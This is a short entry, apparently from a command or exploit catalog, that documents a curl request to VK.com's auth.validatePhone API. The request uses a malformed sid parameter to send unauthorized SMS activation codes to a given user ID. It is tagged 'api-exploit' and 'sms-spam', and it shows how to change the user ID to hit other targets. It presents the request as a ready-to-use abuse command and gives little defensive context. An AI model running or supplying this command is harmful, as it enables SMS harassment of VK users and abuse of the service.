---
id: cmd-vk-sms-001
data: 'curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_23048942_lolka"'
tags:
  - api-exploit
  - sms-spam
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.680Z'
verified: false
validated: true
submitted: true
---
# vk-auth-validatephone-sms-spam

## Command

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_23048942_lolka"
```

## Description

Sends an HTTP GET request to VK.com's auth.validatePhone API using a malformed sid parameter to trigger an unauthorized SMS activation code to user ID 23048942.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sid` | Malformed session ID in format '2fa_<userId>_<arbitraryText>'; here, userId=23048942, arbitraryText=lolka | Yes |

## Examples

### Basic Usage

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_23048942_lolka"
```

### Advanced Usage

Replace userId for different targets:

```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_12345678_customtext"
```

## Expected Output

JSON response like {"response": {...}} with no error code, indicating successful sid validation and SMS dispatch to the target user.

## Related

- [[commands/vk-auth-validatephone-unicode-sms]]
- [[procedures/Trigger-Unauthorized-SMS-Via-Malformed-SID]]
